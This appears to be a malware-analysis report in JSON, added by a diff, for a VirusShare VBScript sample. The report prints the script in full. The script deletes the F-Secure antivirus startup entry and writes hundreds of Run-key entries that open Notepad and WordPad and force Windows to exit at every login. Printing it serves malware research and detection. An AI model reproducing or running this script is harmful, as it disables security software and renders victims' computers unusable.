@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "Dim WSHShell\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nWSHShell.RegDelete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\F-Secure Manager\"\ne = 1\nfor k = 1 to 203\ne = e + 1\nWSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wichtig\" & e, \"C:\\Windows\\Notepad.exe\"\nWSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Now\" & e, \"C:\\Windows\\wordpad.exe\"\nWSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ZZciao\" & e, \"C:\\Windows\\rundll32.exe user.exe,ExitWindows\"\nnext\n\n\n\n\n\n"
+    },
+    "filename": "VirusShare_3261cfe5393bcef6301af81bc501eb28",
+    "filesize": 559,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3261cfe5393bcef6301af81bc501eb28",
+        "sha1": "d235ccab2f1697ed91077c48ba9acab3e1b3747c",
+        "sha256": "7e8114e38aa98921f7a490233c58f7319a47f0a10c6240f2ddcb8363e1f6599f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim WSHShell",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "WSHShell.RegDelete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\F-Secure Manager\"",
+            "e = 1",
+            "for k = 1 to 203",
+            "e = e + 1",
+            "WSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wichtig\" & e, \"C:\\Windows\\Notepad.exe\"",
+            "WSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Now\" & e, \"C:\\Windows\\wordpad.exe\"",
+            "WSHShell.RegWrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ZZciao\" & e, \"C:\\Windows\\rundll32.exe user.exe,ExitWindows\"",
+            "next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.297109",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
